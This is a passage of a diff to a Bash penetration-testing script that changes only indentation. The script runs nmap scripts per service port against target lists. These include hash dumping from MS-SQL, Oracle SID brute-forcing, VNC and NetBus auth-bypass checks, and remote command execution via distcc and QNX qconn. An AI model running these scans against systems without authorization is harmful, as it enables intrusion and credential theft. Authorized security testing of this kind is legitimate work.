+     nmap -iL $name/995.txt -Pn -n --open -p995 --script=banner,sslv2,pop3-capabilities,ssl-dh-params,ssl-enum-ciphers,ssl-ccs-injection,ssl-heartbleed,ssl-poodle,ssl-date,tls-nextprotoneg -sV --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
+     f_cleanup
+     mv tmp4 $name/script-995.txt
 fi
 
 if [[ -e $name/1050.txt ]]; then
-	echo "     COBRA"
-	nmap -iL $name/1050.txt -Pn -n --open -p1050 --script=giop-info --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
-	f_cleanup
-	mv tmp4 $name/script-1050.txt
+     echo "     COBRA"
+     nmap -iL $name/1050.txt -Pn -n --open -p1050 --script=giop-info --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
+     f_cleanup
+     mv tmp4 $name/script-1050.txt
 fi
 
 if [[ -e $name/1080.txt ]]; then
-	echo "     SOCKS"
-	nmap -iL $name/1080.txt -Pn -n --open -p1080 --script=socks-auth-info --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
-	f_cleanup
-	mv tmp4 $name/script-1080.txt
+     echo "     SOCKS"
+     nmap -iL $name/1080.txt -Pn -n --open -p1080 --script=socks-auth-info --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
+     f_cleanup
+     mv tmp4 $name/script-1080.txt
 fi
 
 if [[ -e $name/1099.txt ]]; then
-	echo "     RMI Registry"
-	nmap -iL $name/1099.txt -Pn -n --open -p1099 --script=rmi-dumpregistry --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
-	f_cleanup
-	mv tmp4 $name/script-1099.txt
+     echo "     RMI Registry"
+     nmap -iL $name/1099.txt -Pn -n --open -p1099 --script=rmi-dumpregistry --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
+     f_cleanup
+     mv tmp4 $name/script-1099.txt
 fi
 
 if [[ -e $name/1344.txt ]]; then
-	echo "     ICAP"
-	nmap -iL $name/1344.txt -Pn -n --open -p1344 --script=icap-info --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
-	f_cleanup
-	mv tmp4 $name/script-1344.txt
+     echo "     ICAP"
+     nmap -iL $name/1344.txt -Pn -n --open -p1344 --script=icap-info --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
+     f_cleanup
+     mv tmp4 $name/script-1344.txt
 fi
 
 if [[ -e $name/1352.txt ]]; then
-	echo "     Lotus Domino"
-	nmap -iL $name/1352.txt -Pn -n --open -p1352 --script=domino-enum-users --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
-	f_cleanup
-	mv tmp4 $name/script-1352.txt
+     echo "     Lotus Domino"
+     nmap -iL $name/1352.txt -Pn -n --open -p1352 --script=domino-enum-users --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
+     f_cleanup
+     mv tmp4 $name/script-1352.txt
 fi
 
 if [[ -e $name/1433.txt ]]; then
-	echo "     MS-SQL"
-	nmap -iL $name/1433.txt -Pn -n --open -p1433 --script=ms-sql-dump-hashes,ms-sql-empty-password,ms-sql-info --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
-	f_cleanup
-	mv tmp4 $name/script-1433.txt
+     echo "     MS-SQL"
+     nmap -iL $name/1433.txt -Pn -n --open -p1433 --script=ms-sql-dump-hashes,ms-sql-empty-password,ms-sql-info --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
+     f_cleanup
+     mv tmp4 $name/script-1433.txt
 fi
 
 if [[ -e $name/1434.txt ]]; then
-	echo "     MS-SQL UDP"
-	nmap -iL $name/1434.txt -Pn -n -sU --open -p1434 --script=ms-sql-dac --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
-	f_cleanup
-	mv tmp4 $name/script-1434.txt
+     echo "     MS-SQL UDP"
+     nmap -iL $name/1434.txt -Pn -n -sU --open -p1434 --script=ms-sql-dac --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
+     f_cleanup
+     mv tmp4 $name/script-1434.txt
 fi
 
 if [[ -e $name/1521.txt ]]; then
-	echo "     Oracle"
-	nmap -iL $name/1521.txt -Pn -n --open -p1521 --script=oracle-sid-brute --script oracle-enum-users --script-args oracle-enum-users.sid=ORCL,userdb=orausers.txt --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
-	f_cleanup
-	mv tmp4 $name/script-1521.txt
+     echo "     Oracle"
+     nmap -iL $name/1521.txt -Pn -n --open -p1521 --script=oracle-sid-brute --script oracle-enum-users --script-args oracle-enum-users.sid=ORCL,userdb=orausers.txt --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
+     f_cleanup
+     mv tmp4 $name/script-1521.txt
 fi
 
 if [[ -e $name/1604.txt ]]; then
-	echo "     Citrix"
-	nmap -iL $name/1604.txt -Pn -n -sU --open -p1604 --script=citrix-enum-apps,citrix-enum-servers --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
-	f_cleanup
-	mv tmp4 $name/script-1604.txt
+     echo "     Citrix"
+     nmap -iL $name/1604.txt -Pn -n -sU --open -p1604 --script=citrix-enum-apps,citrix-enum-servers --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
+     f_cleanup
+     mv tmp4 $name/script-1604.txt
 fi
 
 if [[ -e $name/1723.txt ]]; then
-	echo "     PPTP"
-	nmap -iL $name/1723.txt -Pn -n --open -p1723 --script=pptp-version --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
-	f_cleanup
-	mv tmp4 $name/script-1723.txt
+     echo "     PPTP"
+     nmap -iL $name/1723.txt -Pn -n --open -p1723 --script=pptp-version --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
+     f_cleanup
+     mv tmp4 $name/script-1723.txt
 fi
 
 if [[ -e $name/2202.txt ]]; then
-	echo "     ACARS"
-	nmap -iL $name/2202.txt -Pn -n --open -p2202 --script=acarsd-info --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
-	f_cleanup
-	mv tmp4 $name/script-2202.txt
+     echo "     ACARS"
+     nmap -iL $name/2202.txt -Pn -n --open -p2202 --script=acarsd-info --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
+     f_cleanup
+     mv tmp4 $name/script-2202.txt
 fi
 
 if [[ -e $name/2302.txt ]]; then
-	echo "     Freelancer"
-	nmap -iL $name/2302.txt -Pn -n -sU --open -p2302 --script=freelancer-info --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
-	f_cleanup
-	mv tmp4 $name/script-2302.txt
+     echo "     Freelancer"
+     nmap -iL $name/2302.txt -Pn -n -sU --open -p2302 --script=freelancer-info --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
+     f_cleanup
+     mv tmp4 $name/script-2302.txt
 fi
 
 if [[ -e $name/2628.txt ]]; then
-	echo "     DICT"
-	nmap -iL $name/2628.txt -Pn -n --open -p2628 --script=dict-info --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
-	f_cleanup
-	mv tmp4 $name/script-2628.txt
+     echo "     DICT"
+     nmap -iL $name/2628.txt -Pn -n --open -p2628 --script=dict-info --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
+     f_cleanup
+     mv tmp4 $name/script-2628.txt
 fi
 
 if [[ -e $name/2947.txt ]]; then
-	echo "     GPS"
-	nmap -iL $name/2947.txt -Pn -n --open -p2947 --script=gpsd-info --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
-	f_cleanup
-	mv tmp4 $name/script-2947.txt
+     echo "     GPS"
+     nmap -iL $name/2947.txt -Pn -n --open -p2947 --script=gpsd-info --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
+     f_cleanup
+     mv tmp4 $name/script-2947.txt
 fi
 
 if [[ -e $name/3031.txt ]]; then
-	echo "     Apple Remote Event"
-	nmap -iL $name/3031.txt -Pn -n --open -p3031 --script=eppc-enum-processes --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
-	f_cleanup
-	mv tmp4 $name/script-3031.txt
+     echo "     Apple Remote Event"
+     nmap -iL $name/3031.txt -Pn -n --open -p3031 --script=eppc-enum-processes --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
+     f_cleanup
+     mv tmp4 $name/script-3031.txt
 fi
 
 if [[ -e $name/3260.txt ]]; then
-	echo "     iSCSI"
-	nmap -iL $name/3260.txt -Pn -n --open -p3260 --script=iscsi-info --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
-	f_cleanup
-	mv tmp4 $name/script-3260.txt
+     echo "     iSCSI"
+     nmap -iL $name/3260.txt -Pn -n --open -p3260 --script=iscsi-info --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
+     f_cleanup
+     mv tmp4 $name/script-3260.txt
 fi
 
 if [[ -e $name/3306.txt ]]; then
-	echo "     MySQL"
-	nmap -iL $name/3306.txt -Pn -n --open -p3306 --script=mysql-databases,mysql-empty-password,mysql-info,mysql-users,mysql-variables --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
-	f_cleanup
-	mv tmp4 $name/script-3306.txt
+     echo "     MySQL"
+     nmap -iL $name/3306.txt -Pn -n --open -p3306 --script=mysql-databases,mysql-empty-password,mysql-info,mysql-users,mysql-variables --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
+     f_cleanup
+     mv tmp4 $name/script-3306.txt
 fi
 
 if [[ -e $name/3389.txt ]]; then
-	echo "     Remote Desktop"
-	nmap -iL $name/3389.txt -Pn -n --open -p3389 --script=rdp-vuln-ms12-020,rdp-enum-encryption --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
-	f_cleanup
-	egrep -v '(attackers|Description|Disclosure|http|References|Risk factor)' tmp4 > $name/script-3389.txt
+     echo "     Remote Desktop"
+     nmap -iL $name/3389.txt -Pn -n --open -p3389 --script=rdp-vuln-ms12-020,rdp-enum-encryption --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
+     f_cleanup
+     egrep -v '(attackers|Description|Disclosure|http|References|Risk factor)' tmp4 > $name/script-3389.txt
 fi
 
 if [[ -e $name/3478.txt ]]; then
-	echo "     STUN"
-	nmap -iL $name/3478.txt -Pn -n -sU --open -p3478 --script=stun-version --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
-	f_cleanup
-	mv tmp4 $name/script-3478.txt
+     echo "     STUN"
+     nmap -iL $name/3478.txt -Pn -n -sU --open -p3478 --script=stun-version --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
+     f_cleanup
+     mv tmp4 $name/script-3478.txt
 fi
 
 if [[ -e $name/3632.txt ]]; then
-	echo "     Distributed Compiler Daemon"
-	nmap -iL $name/3632.txt -Pn -n --open -p3632 --script=distcc-cve2004-2687 --script-args="distcc-exec.cmd='id'" --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
-	f_cleanup
+     echo "     Distributed Compiler Daemon"
+     nmap -iL $name/3632.txt -Pn -n --open -p3632 --script=distcc-cve2004-2687 --script-args="distcc-exec.cmd='id'" --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
+     f_cleanup
      egrep -v '(IDs|Risk factor|Description|Allows|earlier|Disclosure|Extra|References|http)' tmp4 > $name/script-3632.txt
 fi
 
 if [[ -e $name/4369.txt ]]; then
-	echo "     Erlang Port Mapper"
-	nmap -iL $name/4369.txt -Pn -n --open -p4369 --script=epmd-info --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
-	f_cleanup
-	mv tmp4 $name/script-4369.txt
+     echo "     Erlang Port Mapper"
+     nmap -iL $name/4369.txt -Pn -n --open -p4369 --script=epmd-info --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
+     f_cleanup
+     mv tmp4 $name/script-4369.txt
 fi
 
 if [[ -e $name/5019.txt ]]; then
-	echo "     Versant"
-	nmap -iL $name/5019.txt -Pn -n --open -p5019 --script=versant-info --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
-	f_cleanup
-	mv tmp4 $name/script-5019.txt
+     echo "     Versant"
+     nmap -iL $name/5019.txt -Pn -n --open -p5019 --script=versant-info --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
+     f_cleanup
+     mv tmp4 $name/script-5019.txt
 fi
 
 if [[ -e $name/5060.txt ]]; then
-	echo "     SIP"
-	nmap -iL $name/5060.txt -Pn -n --open -p5060 --script=sip-enum-users,sip-methods --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
-	f_cleanup
-	mv tmp4 $name/script-5060.txt
+     echo "     SIP"
+     nmap -iL $name/5060.txt -Pn -n --open -p5060 --script=sip-enum-users,sip-methods --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
+     f_cleanup
+     mv tmp4 $name/script-5060.txt
 fi
 
 if [[ -e $name/5353.txt ]]; then
-	echo "     DNS Service Discovery"
-	nmap -iL $name/5353.txt -Pn -n -sU --open -p5353 --script=dns-service-discovery --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
-	f_cleanup
-	mv tmp4 $name/script-5353.txt
+     echo "     DNS Service Discovery"
+     nmap -iL $name/5353.txt -Pn -n -sU --open -p5353 --script=dns-service-discovery --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
+     f_cleanup
+     mv tmp4 $name/script-5353.txt
 fi
 
 if [[ -e $name/5666.txt ]]; then
-	echo "     Nagios"
-	nmap -iL $name/5666.txt -Pn -n --open -p5666 --script=nrpe-enum --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
-	f_cleanup
-	mv tmp4 $name/script-5666.txt
+     echo "     Nagios"
+     nmap -iL $name/5666.txt -Pn -n --open -p5666 --script=nrpe-enum --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
+     f_cleanup
+     mv tmp4 $name/script-5666.txt
 fi
 
 if [[ -e $name/5672.txt ]]; then
-	echo "     AMQP"
-	nmap -iL $name/5672.txt -Pn -n --open -p5672 --script=amqp-info --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
-	f_cleanup
-	mv tmp4 $name/script-5672.txt
+     echo "     AMQP"
+     nmap -iL $name/5672.txt -Pn -n --open -p5672 --script=amqp-info --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
+     f_cleanup
+     mv tmp4 $name/script-5672.txt
 fi
 
 if [[ -e $name/5850.txt ]]; then
-	echo "     OpenLookup"
-	nmap -iL $name/5850.txt -Pn -n --open -p5850 --script=openlookup-info --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
-	f_cleanup
-	mv tmp4 $name/script-5850.txt
+     echo "     OpenLookup"
+     nmap -iL $name/5850.txt -Pn -n --open -p5850 --script=openlookup-info --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
+     f_cleanup
+     mv tmp4 $name/script-5850.txt
 fi
 
 if [[ -e $name/5900.txt ]]; then
-	echo "     VNC"
-	nmap -iL $name/5900.txt -Pn -n --open -p5900 --script=realvnc-auth-bypass,vnc-info --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
-	f_cleanup
-	mv tmp4 $name/script-5900.txt
+     echo "     VNC"
+     nmap -iL $name/5900.txt -Pn -n --open -p5900 --script=realvnc-auth-bypass,vnc-info --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
+     f_cleanup
+     mv tmp4 $name/script-5900.txt
 fi
 
 if [[ -e $name/5984.txt ]]; then
-	echo "     CouchDB"
-	nmap -iL $name/5984.txt -Pn -n --open -p5984 --script=couchdb-databases,couchdb-stats --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
-	f_cleanup
-	mv tmp4 $name/script-5984.txt
+     echo "     CouchDB"
+     nmap -iL $name/5984.txt -Pn -n --open -p5984 --script=couchdb-databases,couchdb-stats --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
+     f_cleanup
+     mv tmp4 $name/script-5984.txt
 fi
 
 if [[ -e $name/x11.txt ]]; then
-	echo "     X11"
-	nmap -iL $name/x11.txt -Pn -n --open -p6000-6005 --script=x11-access --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
-	f_cleanup
-	mv tmp4 $name/script-x11.txt
+     echo "     X11"
+     nmap -iL $name/x11.txt -Pn -n --open -p6000-6005 --script=x11-access --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
+     f_cleanup
+     mv tmp4 $name/script-x11.txt
 fi
 
 if [[ -e $name/6379.txt ]]; then
-	echo "     Redis"
-	nmap -iL $name/6379.txt -Pn -n --open -p6379 --script=redis-info --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
-	f_cleanup
-	mv tmp4 $name/script-6379.txt
+     echo "     Redis"
+     nmap -iL $name/6379.txt -Pn -n --open -p6379 --script=redis-info --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
+     f_cleanup
+     mv tmp4 $name/script-6379.txt
 fi
 
 if [[ -e $name/6481.txt ]]; then
-	echo "     Sun Service Tags"
-	nmap -iL $name/6481.txt -Pn -n -sU --open -p6481 --script=servicetags --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
-	f_cleanup
-	mv tmp4 $name/script-6481.txt
+     echo "     Sun Service Tags"
+     nmap -iL $name/6481.txt -Pn -n -sU --open -p6481 --script=servicetags --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
+     f_cleanup
+     mv tmp4 $name/script-6481.txt
 fi
 
 if [[ -e $name/6666.txt ]]; then
-	echo "     Voldemort"
-	nmap -iL $name/6666.txt -Pn -n --open -p6666 --script=voldemort-info --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
-	f_cleanup
-	mv tmp4 $name/script-6666.txt
+     echo "     Voldemort"
+     nmap -iL $name/6666.txt -Pn -n --open -p6666 --script=voldemort-info --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
+     f_cleanup
+     mv tmp4 $name/script-6666.txt
 fi
 
 if [[ -e $name/7210.txt ]]; then
-	echo "     Max DB"
-	nmap -iL $name/7210.txt -Pn -n --open -p7210 --script=maxdb-info --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
-	f_cleanup
-	mv tmp4 $name/script-7210.txt
+     echo "     Max DB"
+     nmap -iL $name/7210.txt -Pn -n --open -p7210 --script=maxdb-info --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
+     f_cleanup
+     mv tmp4 $name/script-7210.txt
 fi
 
 if [[ -e $name/7634.txt ]]; then
-	echo "     Hard Disk Info"
-	nmap -iL $name/7634.txt -Pn -n --open -p7634 --script=hddtemp-info --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
-	f_cleanup
-	mv tmp4 $name/script-7634.txt
+     echo "     Hard Disk Info"
+     nmap -iL $name/7634.txt -Pn -n --open -p7634 --script=hddtemp-info --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
+     f_cleanup
+     mv tmp4 $name/script-7634.txt
 fi
 
 if [[ -e $name/8000.txt ]]; then
-        echo "     QNX QCONN"
-        nmap -iL $name/8000.txt -Pn -n --open -p8000 --script=qconn-exec --script-args=qconn-exec.timeout=60,qconn-exec.bytes=1024,qconn-exec.cmd="uname -a" --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
-        f_cleanup
-        mv tmp4 $name/script-8000.txt
+     echo "     QNX QCONN"
+     nmap -iL $name/8000.txt -Pn -n --open -p8000 --script=qconn-exec --script-args=qconn-exec.timeout=60,qconn-exec.bytes=1024,qconn-exec.cmd="uname -a" --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
+     f_cleanup
+     mv tmp4 $name/script-8000.txt
 fi
 
 if [[ -e $name/8009.txt ]]; then
-        echo "     AJP"
-        nmap -iL $name/8009.txt -Pn -n --open -p8009 --script=ajp-methods,ajp-request --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
-        f_cleanup
-        mv tmp4 $name/script-8009.txt
+     echo "     AJP"
+     nmap -iL $name/8009.txt -Pn -n --open -p8009 --script=ajp-methods,ajp-request --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
+     f_cleanup
+     mv tmp4 $name/script-8009.txt
 fi
 
 if [[ -e $name/8081.txt ]]; then
-	echo "     McAfee ePO"
-	nmap -iL $name/8081.txt -Pn -n --open -p8081 --script=mcafee-epo-agent --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
-	f_cleanup
-	mv tmp4 $name/script-8081.txt
+     echo "     McAfee ePO"
+     nmap -iL $name/8081.txt -Pn -n --open -p8081 --script=mcafee-epo-agent --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
+     f_cleanup
+     mv tmp4 $name/script-8081.txt
 fi
 
 if [[ -e $name/8091.txt ]]; then
-	echo "     CouchBase Web Administration"
-	nmap -iL $name/8091.txt -Pn -n --open -p8091 --script=membase-http-info --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
-	f_cleanup
-	mv tmp4 $name/script-8091.txt
+     echo "     CouchBase Web Administration"
+     nmap -iL $name/8091.txt -Pn -n --open -p8091 --script=membase-http-info --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
+     f_cleanup
+     mv tmp4 $name/script-8091.txt
 fi
 
 if [[ -e $name/bitcoin.txt ]]; then
-	echo "     Bitcoin"
-	nmap -iL $name/bitcoin.txt -Pn -n --open -p8332,8333 --script=bitcoin-getaddr,bitcoin-info,bitcoinrpc-info --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
-	f_cleanup
-	mv tmp4 $name/script-bitcoin.txt
+     echo "     Bitcoin"
+     nmap -iL $name/bitcoin.txt -Pn -n --open -p8332,8333 --script=bitcoin-getaddr,bitcoin-info,bitcoinrpc-info --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
+     f_cleanup
+     mv tmp4 $name/script-bitcoin.txt
 fi
 
 if [[ -e $name/9100.txt ]]; then
-	echo "     Lexmark"
-	nmap -iL $name/9100.txt -Pn -n --open -p9100 --script=lexmark-config --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
-	f_cleanup
-	mv tmp4 $name/script-9100.txt
+     echo "     Lexmark"
+     nmap -iL $name/9100.txt -Pn -n --open -p9100 --script=lexmark-config --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
+     f_cleanup
+     mv tmp4 $name/script-9100.txt
 fi
 
 if [[ -e $name/9160.txt ]]; then
-	echo "     Cassandra"
-	nmap -iL $name/9160.txt -Pn -n --open -p9160 --script=cassandra-info --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
-	f_cleanup
-	mv tmp4 $name/script-9160.txt
+     echo "     Cassandra"
+     nmap -iL $name/9160.txt -Pn -n --open -p9160 --script=cassandra-info --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
+     f_cleanup
+     mv tmp4 $name/script-9160.txt
 fi
 
 if [[ -e $name/9999.txt ]]; then
-	echo "     Java Debug Wire Protocol"
-	nmap -iL $name/9999.txt -Pn -n --open -p9999 --script=jdwp-version --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
-	f_cleanup
-	mv tmp4 $name/script-9999.txt
+     echo "     Java Debug Wire Protocol"
+     nmap -iL $name/9999.txt -Pn -n --open -p9999 --script=jdwp-version --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
+     f_cleanup
+     mv tmp4 $name/script-9999.txt
 fi
 
 if [[ -e $name/10000.txt ]]; then
-	echo "     Network Data Management"
-	nmap -iL $name/10000.txt -Pn -n --open -p10000 --script=ndmp-fs-info,ndmp-version --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
-	f_cleanup
-	mv tmp4 $name/script-10000.txt
+     echo "     Network Data Management"
+     nmap -iL $name/10000.txt -Pn -n --open -p10000 --script=ndmp-fs-info,ndmp-version --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
+     f_cleanup
+     mv tmp4 $name/script-10000.txt
 fi
 
 if [[ -e $name/11211.txt ]]; then
-	echo "     Memory Object Caching"
-	nmap -iL $name/11211.txt -Pn -n --open -p11211 --script=memcached-info --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
-	f_cleanup
-	mv tmp4 $name/script-11211.txt
+     echo "     Memory Object Caching"
+     nmap -iL $name/11211.txt -Pn -n --open -p11211 --script=memcached-info --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
+     f_cleanup
+     mv tmp4 $name/script-11211.txt
 fi
 
 if [[ -e $name/12000.txt ]]; then
-	echo "     CCcam"
-	nmap -iL $name/12000.txt -Pn -n --open -p12000 --script=cccam-version --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
-	f_cleanup
-	mv tmp4 $name/script-12000.txt
+     echo "     CCcam"
+     nmap -iL $name/12000.txt -Pn -n --open -p12000 --script=cccam-version --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
+     f_cleanup
+     mv tmp4 $name/script-12000.txt
 fi
 
 if [[ -e $name/12345.txt ]]; then
-	echo "     NetBus"
-	nmap -iL $name/12345.txt -Pn -n --open -p12345 --script=netbus-auth-bypass,netbus-version --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
-	f_cleanup
-	mv tmp4 $name/script-12345.txt
+     echo "     NetBus"
+     nmap -iL $name/12345.txt -Pn -n --open -p12345 --script=netbus-auth-bypass,netbus-version --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
+     f_cleanup
+     mv tmp4 $name/script-12345.txt
 fi
 
 if [[ -e $name/17185.txt ]]; then
-	echo "     VxWorks"
-	nmap -iL $name/17185.txt -Pn -n -sU --open -p17185 --script=wdb-version --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
-	f_cleanup
-	mv tmp4 $name/script-17185.txt
+     echo "     VxWorks"
+     nmap -iL $name/17185.txt -Pn -n -sU --open -p17185 --script=wdb-version --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
+     f_cleanup
+     mv tmp4 $name/script-17185.txt
 fi
 
 if [[ -e $name/19150.txt ]]; then
-	echo "     GKRellM"
-	nmap -iL $name/19150.txt -Pn -n --open -p19150 --script=gkrellm-info --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
-	f_cleanup
-	mv tmp4 $name/script-19150.txt
+     echo "     GKRellM"
+     nmap -iL $name/19150.txt -Pn -n --open -p19150 --script=gkrellm-info --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
+     f_cleanup
+     mv tmp4 $name/script-19150.txt
 fi
 
 if [[ -e $name/27017.txt ]]; then
-	echo "     MongoDB"
-	nmap -iL $name/27017.txt -Pn -n --open -p27017 --script=mongodb-databases,mongodb-info --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
-	f_cleanup
-	mv tmp4 $name/script-27017.txt
+     echo "     MongoDB"
+     nmap -iL $name/27017.txt -Pn -n --open -p27017 --script=mongodb-databases,mongodb-info --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
+     f_cleanup
+     mv tmp4 $name/script-27017.txt
 fi
 
 if [[ -e $name/31337.txt ]]; then
-	echo "     BackOrifice"
-	nmap -iL $name/31337.txt -Pn -n -sU --open -p31337 --script=backorifice-info --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
-	f_cleanup
-	mv tmp4 $name/script-31337.txt
+     echo "     BackOrifice"
+     nmap -iL $name/31337.txt -Pn -n -sU --open -p31337 --script=backorifice-info --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
+     f_cleanup
+     mv tmp4 $name/script-31337.txt
 fi
 
 if [[ -e $name/35871.txt ]]; then
-	echo "     Flume"
-	nmap -iL $name/35871.txt -Pn -n --open -p35871 --script=flume-master-info --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
-	f_cleanup
-	mv tmp4 $name/script-35871.txt
+     echo "     Flume"
+     nmap -iL $name/35871.txt -Pn -n --open -p35871 --script=flume-master-info --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
+     f_cleanup
+     mv tmp4 $name/script-35871.txt
 fi
 
 if [[ -e $name/50000.txt ]]; then
-	echo "     DRDA"
